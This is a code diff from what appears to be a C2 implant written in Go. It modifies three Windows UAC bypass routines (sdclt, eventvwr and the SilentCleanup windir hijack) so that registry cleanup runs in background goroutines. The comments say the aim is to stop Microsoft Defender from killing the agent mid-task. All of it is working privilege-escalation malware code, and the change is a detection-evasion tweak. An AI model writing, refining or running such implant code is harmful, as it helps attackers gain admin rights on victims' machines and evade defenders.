@@ -223,12 +223,15 @@ func uacBypassSdclt(command string) structs.CommandResult {
 	}
 	output += "[+] Launched sdclt.exe via ShellExecute\n"
 
-	// Step 3: Wait briefly then clean up registry
-	jitterSleep(1500*time.Millisecond, 3*time.Second)
-	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
-	cleanupSdcltKey()
-	output += "[+] Registry keys shredded and removed\n\n"
+	// Step 3: Clean up registry in background goroutine.
+	// Return task result immediately to prevent Defender from killing the agent
+	// mid-task (sdclt opens a GUI that gives Defender time to detect the behavior).
+	go func() {
+		jitterSleep(1500*time.Millisecond, 3*time.Second)
+		cleanupSdcltKey()
+	}()
 
+	output += "[*] Registry cleanup scheduled (background)\n\n"
 	output += "[+] UAC bypass triggered successfully.\n"
 	output += "[*] If successful, a new elevated callback should appear shortly.\n"
 	output += "[*] The elevated process runs at high integrity (admin)."
@@ -327,12 +330,15 @@ func uacBypassEventvwr(command string) structs.CommandResult {
 	}
 	output += "[+] Launched eventvwr.exe via ShellExecute\n"
 
-	// Step 3: Wait briefly then clean up registry
-	jitterSleep(1500*time.Millisecond, 3*time.Second)
-	output += "[*] Step 3: Cleaning up registry (shredding values)...\n"
-	cleanupEventvwrKey()
-	output += "[+] Registry keys shredded and removed\n\n"
+	// Step 3: Clean up registry in background goroutine.
+	// Return task result immediately to prevent Defender from killing the agent
+	// mid-task (eventvwr opens mmc.exe GUI that gives Defender time to detect).
+	go func() {
+		jitterSleep(1500*time.Millisecond, 3*time.Second)
+		cleanupEventvwrKey()
+	}()
 
+	output += "[*] Registry cleanup scheduled (background)\n\n"
 	output += "[+] UAC bypass triggered successfully.\n"
 	output += "[*] If successful, a new elevated callback should appear shortly.\n"
 	output += "[*] The elevated process runs at high integrity (admin)."
@@ -395,20 +401,23 @@ func uacBypassSilentCleanup(command string) structs.CommandResult {
 		output += "[*] Continuing with cleanup (task may still execute)...\n"
 	}
 
-	// Step 3: Wait briefly then restore the environment
-	jitterSleep(2*time.Second, 4*time.Second)
-	output += "[*] Step 3: Restoring environment variable...\n"
-	envKey, err = registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.SET_VALUE)
-	if err == nil {
-		if hasOrigWindir {
-			_ = envKey.SetStringValue("windir", origWindir)
-		} else {
-			_ = envKey.DeleteValue("windir")
+	// Step 3: Restore the environment in background goroutine.
+	// Return task result immediately to prevent Defender from killing the agent
+	// mid-task (SilentCleanup behavioral detection kills the originating process).
+	go func() {
+		jitterSleep(2*time.Second, 4*time.Second)
+		envKey, err = registry.OpenKey(registry.CURRENT_USER, `Environment`, registry.SET_VALUE)
+		if err == nil {
+			if hasOrigWindir {
+				_ = envKey.SetStringValue("windir", origWindir)
+			} else {
+				_ = envKey.DeleteValue("windir")
+			}
+			envKey.Close()
 		}
-		envKey.Close()
-	}
-	output += "[+] Environment variable restored\n\n"
+	}()
 
+	output += "[*] Environment cleanup scheduled (background)\n\n"
 	output += "[+] UAC bypass triggered successfully.\n"
 	output += "[*] If successful, a new elevated callback should appear shortly.\n"
 	output += "[*] The elevated process runs at high integrity (admin)."
